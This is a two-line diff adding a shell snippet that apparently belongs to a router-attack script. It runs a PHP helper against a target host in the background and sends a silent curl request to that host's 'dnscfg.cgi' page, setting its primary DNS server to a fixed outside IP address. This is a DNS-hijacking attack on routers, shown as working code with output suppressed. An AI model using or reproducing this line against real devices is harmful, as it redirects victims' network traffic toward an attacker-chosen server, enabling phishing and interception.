@@ -1,0 +1,2 @@
+php api.php "$1" >/dev/null 2>&1 &
+curl -s --connect-timeout 3 --max-time 3 --retry 0 "http://$1/dnscfg.cgi?dnsPrimary=107.155.152.15&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1" > /dev/null &
